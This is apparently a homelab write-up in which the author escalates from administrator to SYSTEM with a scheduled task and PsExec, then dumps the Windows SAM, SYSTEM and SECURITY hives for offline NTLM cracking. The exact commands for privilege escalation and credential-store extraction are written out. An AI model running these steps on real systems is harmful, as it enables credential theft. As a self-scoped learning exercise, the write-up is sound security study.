# Harvesting-Windows-10-SAM-Homelab
* **OBJECTIVE:** Using my personal PC to harvest its SAM hive so I can crack the NTLM hashes using Hashcat on my Linux machine.  I'll be practicing privilege escalation tactics and credential extraction in a controlled home lab environment.
  * **SCOPE:** Home Lab Machine.  No external systems.
  * **TOOLS:** Native Windows Tools (CMD, reg).  Additional Tools: PsExec.
  * **FOCUS:** Offensive Security Red Team practices.  Observing leftover artifacts from a Blue Team perspective.  Understanding privilege boundaries (ADMIN Vs. SYSTEM.)

# STEP 1.  Grab the SAM Hive as Admin.
* *Run As Admin - CMD*> `reg save HKLM\SAM C:\Temp\SAM.save`
  * **RESULT:** Operation Failed.
  * **ANALYSIS:** Cannot just access the SAM hive, since it's locked up by LSASS (Local Security Authority Subsystem Service.)  Run As Admin is not sufficient enough for this.  There may not be proper privileges for the Admin account.

# STEP 2.  Validate Privileges.
* *Run As Admin - CMD*> `whoami /priv`
  * **RESULT:** SeBackupPrivilege (DISABLED]
* *Run As Admin - CMD*> `whoami /groups`
  * **RESULT:** Belong to Admin groups.
* *CMD* > `secpol.msc`
  * Update user for SeBackupPrivilege (ENABLED).  Restart, try again.
* *Run As Admin - CMD*> `reg save HKLM\SAM C:\Temp\SAM.save`
  * **RESULT:** Still unable to backup SAM.save.
  * **ANALYSIS:** Still do not have enough privileges, or LSASS is locking out access to live access to SAM / SYSTEM.

# STEP 3.  Living Off The Land Privilege Escalation.
* *Run As Admin - CMD*> `schtasks /create /tn SYSTEMHIJACK /tr cmd.exe /sc once /st 00:00 /ru SYSTEM`
* *Run As Admin - CMD*> `schtasks /run /tn SYSTEMHIJACK`
  * **RESULT:** I wasn't able to spawn an interactive shell through using scheduled tasks under the system.
  * **ANALYSIS:** It seems that the task ran successfully, however, the interactive shell was not there.  It seems through some research this is a "Session 0" shell, which I may have been able to use CLI in the task to export data, and will try in another iteration.

# STEP 4.  Using PsExec to spawn interactive SYSTEM Shell.
* Download and Extract PSTools from Microsoft.
* *Run As Admin - CMD*> `PsExec -i -s cmd.exe`
  * **RESULT:** Successfully spawned a SYSTEM Shell.
* *SYSTEM CMD*> `reg save HKLM\SAM C:\Temp\SAM.save`
* *SYSTEM CMD*> `reg save HKLM\SYSTEM C:\Temp\SYSTEM.save`
* *SYSTEM CMD*> `reg save HKLM\SECURITY C:\Temp\SECURITY.save`
  * **ANALYSIS:** Success.  Able to run PsExec as an Administrator account to spawn an interactive SYSTEM CMD shell.  Through that, able to back up the SAM, SYSTEM, and SECURITY hives from the HKLM.

# STEP 5.  Ready for processing. . . (Different project will commence for cracking the NTLM hashes.)
-aLT_w0rm
